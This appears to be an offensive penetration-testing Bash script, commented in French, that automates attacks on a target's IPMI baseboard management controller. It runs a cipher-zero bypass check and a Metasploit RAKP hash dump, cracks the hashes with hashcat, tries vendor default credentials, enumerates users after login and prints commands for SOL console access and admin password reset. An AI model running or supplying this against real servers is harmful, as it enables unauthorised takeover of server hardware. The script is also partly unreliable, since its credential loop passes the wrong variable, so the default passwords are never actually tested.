#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — IPMI (UDP 623)        ║
# ║   Usage: ./enum_ipmi.sh <TARGET>    ║
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"

require_target "$TARGET"
banner "IPMI (UDP port 623)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "ipmi")

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — IPMI UDP scan" "$OUTDIR/nmap_ipmi.txt" \
    sudo nmap -sU -p623 -sV \
    --script ipmi-version,ipmi-cipher-zero \
    -oN "$OUTDIR/nmap_ipmi_raw.txt" \
    "$TARGET"

IPMI_VER=$(grep -oP 'IPMI-[\d.]+\|Version\s+[\d.]+\|BMC.*[\d.]+' \
    "$OUTDIR/nmap_ipmi.txt" 2>/dev/null | head -1)
[[ -n "$IPMI_VER" ]] && finding "Version IPMI : $IPMI_VER"

MANUFACTURER=$(grep -oP '(HP|Dell|Supermicro|IBM|Lenovo|Oracle|Fujitsu)[^\n]*' \
    "$OUTDIR/nmap_ipmi.txt" 2>/dev/null | head -1)
[[ -n "$MANUFACTURER" ]] && finding "Fabricant : $MANUFACTURER"

# Cipher Zero vuln
if grep -qi "cipher.*zero\|cipher 0\|VULNERABLE" "$OUTDIR/nmap_ipmi.txt" 2>/dev/null; then
    success "CIPHER ZERO DÉTECTÉ → authentication bypass !"
    finding "Cipher Zero (CVE vulnérable) → auth bypass avec n'importe quel password"
    echo "CIPHER_ZERO" >> "$OUTDIR/findings.txt"
fi

# ─── 2. RAKP HASH DUMP ──────────────────────────────────────
section "2. RAKP HASH DUMP (CVE-2013-4786)"

info "Flaw RAKP — dump des hashes IPMI sans credentials"
warn "Note: Cette faille permet de récupérer le hash md5 du password BMC"

if check_tool ipmitool; then
    info "Test connectivité IPMI"
    timeout 10 ipmitool -I lanplus -H "$TARGET" -U "" -P "" \
        chassis status 2>&1 | head -5 | tee "$OUTDIR/ipmi_test.txt"
fi

# Metasploit module pour RAKP dump
cat > "$OUTDIR/msf_rakp.rc" << MSFRC
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS $TARGET
set OUTPUT_HASHCAT_FILE $OUTDIR/ipmi_hashes_hashcat.txt
set OUTPUT_JOHN_FILE $OUTDIR/ipmi_hashes_john.txt
run
exit
MSFRC

if check_tool msfconsole; then
    info "Lancement Metasploit — RAKP hash dump"
    timeout 60 msfconsole -q -r "$OUTDIR/msf_rakp.rc" 2>&1 | tee "$OUTDIR/msf_rakp.txt"

    if [[ -s "$OUTDIR/ipmi_hashes_hashcat.txt" ]]; then
        success "Hashes IPMI récupérés !"
        cat "$OUTDIR/ipmi_hashes_hashcat.txt"
        finding "Hashes IPMI → hashcat -m 7300"
        echo "RAKP_HASHES_DUMPED" >> "$OUTDIR/findings.txt"
    elif grep -qi "Hash Found\|hash.*dumped\|password hash" "$OUTDIR/msf_rakp.txt" 2>/dev/null; then
        success "Hashes trouvés dans les logs MSF"
        grep -i "hash\|password" "$OUTDIR/msf_rakp.txt" | tee "$OUTDIR/hashes_raw.txt"
    fi
else
    warn "msfconsole non disponible"
    info "Commandes manuelles pour RAKP dump :"
    cat << 'MANUAL'
# Via Metasploit :
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <TARGET>
run

# Via impacket (si disponible) :
# ipmi-dump.py -t <TARGET>
MANUAL
fi

# ─── 3. CRACK DES HASHES ────────────────────────────────────
section "3. CRACK DES HASHES IPMI"

if [[ -s "$OUTDIR/ipmi_hashes_hashcat.txt" ]] && check_tool hashcat; then
    info "Hashcat — crack hashes IPMI (mode 7300)"

    # Wordlist
    WORDLIST=""
    for wl in \
        "/usr/share/wordlists/rockyou.txt" \
        "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"; do
        [[ -f "$wl" ]] && WORDLIST="$wl" && break
    done

    if [[ -n "$WORDLIST" ]]; then
        info "Crack avec wordlist : $WORDLIST"
        run_long "hashcat IPMI" "$OUTDIR/hashcat_results.txt" 120 \
            hashcat -m 7300 "$OUTDIR/ipmi_hashes_hashcat.txt" "$WORDLIST" \
            --quiet --show 2>/dev/null || \
            hashcat -m 7300 "$OUTDIR/ipmi_hashes_hashcat.txt" "$WORDLIST" --quiet

        hashcat -m 7300 "$OUTDIR/ipmi_hashes_hashcat.txt" --show 2>/dev/null | \
            tee "$OUTDIR/cracked_passwords.txt"

        if [[ -s "$OUTDIR/cracked_passwords.txt" ]]; then
            success "PASSWORDS CRACKÉS !"
            cat "$OUTDIR/cracked_passwords.txt"
            finding "Passwords IPMI crackés !"
            echo "CRACKED" >> "$OUTDIR/findings.txt"
        fi
    fi

    # HP iLO mask attack (mot de passe par défaut = 8 chars alphanum)
    if echo "$MANUFACTURER" | grep -qi "HP\|iLO"; then
        info "HP iLO — attaque masque (8 chars alphanum)"
        run_long "hashcat mask HP iLO" "$OUTDIR/hashcat_mask.txt" 180 \
            hashcat -m 7300 "$OUTDIR/ipmi_hashes_hashcat.txt" \
            -a 3 "?a?a?a?a?a?a?a?a" --quiet
        hashcat -m 7300 "$OUTDIR/ipmi_hashes_hashcat.txt" --show 2>/dev/null | \
            tee -a "$OUTDIR/cracked_passwords.txt"
    fi
elif [[ -s "$OUTDIR/ipmi_hashes_hashcat.txt" ]]; then
    warn "hashcat non disponible"
    info "Commande de crack :"
    echo -e "${CYAN}  hashcat -m 7300 $OUTDIR/ipmi_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt${NC}"
    info "John the Ripper :"
    echo -e "${CYAN}  john --wordlist=/usr/share/wordlists/rockyou.txt $OUTDIR/ipmi_hashes_john.txt${NC}"
fi

# ─── 4. DEFAULT CREDENTIALS ─────────────────────────────────
section "4. CREDENTIALS PAR DÉFAUT"

declare -A DEFAULT_CREDS=(
    ["HP iLO"]="Administrator:HPASSWORD (label sous le serveur)"
    ["Dell iDRAC"]="root:calvin"
    ["Supermicro"]="ADMIN:ADMIN"
    ["IBM IMM"]="USERID:PASSW0RD"
    ["Fujitsu iRMC"]="admin:admin"
    ["Oracle ILOM"]="root:changeme"
)

for brand in "${!DEFAULT_CREDS[@]}"; do
    info "$brand : ${DEFAULT_CREDS[$brand]}"
done

# Test creds par défaut via ipmitool
if check_tool ipmitool; then
    CRED_TESTS=(
        "root:calvin"
        "ADMIN:ADMIN"
        "admin:admin"
        "Administrator:password"
        "root:changeme"
        "USERID:PASSW0RD"
    )

    info "Test credentials par défaut (ipmitool)"
    for cred in "${CRED_TESTS[@]}"; do
        u="${cred%%:*}"
        p="${cred##*:}"
        info "Test : $u:$p"
        RESULT=$(timeout 8 ipmitool -I lanplus -H "$TARGET" -U "$u" -P "$P" \
            chassis status 2>&1)
        if echo "$RESULT" | grep -qi "System Power State\|Power is on"; then
            success "CREDENTIALS VALIDES : $u:$p"
            echo "$u:$p" >> "$OUTDIR/valid_creds.txt"
            finding "Accès BMC : $u:$p"
            echo "BMC_ACCESS" >> "$OUTDIR/findings.txt"
            break
        fi
    done
fi

# Test MSF scanner
cat > "$OUTDIR/msf_defaultcreds.rc" << MSFRC2
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS $TARGET
run
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS $TARGET
run
exit
MSFRC2

# ─── 5. ENUM APRÈS ACCÈS ────────────────────────────────────
if [[ -s "$OUTDIR/valid_creds.txt" ]] && check_tool ipmitool; then
    section "5. ENUM POST-CONNEXION"

    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER="${VALID_LINE%%:*}"
    V_PASS="${VALID_LINE##*:}"

    IPMI_AUTH="-I lanplus -H $TARGET -U $V_USER -P $V_PASS"

    info "Utilisateurs BMC"
    timeout 10 ipmitool $IPMI_AUTH user list 2>&1 | tee "$OUTDIR/bmc_users.txt"

    info "Informations système"
    timeout 10 ipmitool $IPMI_AUTH fru 2>&1 | tee "$OUTDIR/bmc_fru.txt"

    info "Chassis status"
    timeout 10 ipmitool $IPMI_AUTH chassis status 2>&1 | tee "$OUTDIR/bmc_chassis.txt"

    info "Accès console SOL (Serial Over LAN)"
    echo -e "${CYAN}  ipmitool $IPMI_AUTH sol activate${NC}"

    info "Reset password admin"
    echo -e "${CYAN}  ipmitool $IPMI_AUTH user set password <USER_ID> <NEW_PASS>${NC}"

    # Dump hash depuis CLI
    info "Dump hash via IPMI"
    timeout 15 ipmitool $IPMI_AUTH user list 2>&1 | awk '{print $1}' | while read -r uid; do
        [[ "$uid" =~ ^[0-9]+$ ]] && \
            timeout 5 ipmitool $IPMI_AUTH user test "$uid" 16 "" 2>&1 | head -2
    done | tee "$OUTDIR/user_hashes.txt"
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$MANUFACTURER" ]] && info "Fabricant : $MANUFACTURER"

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/cracked_passwords.txt" ]] && {
    echo ""
    success "Passwords crackés :"
    cat "$OUTDIR/cracked_passwords.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}

echo ""
info "Hashes pour crack manuel :"
echo -e "  hashcat -m 7300 $OUTDIR/ipmi_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt"
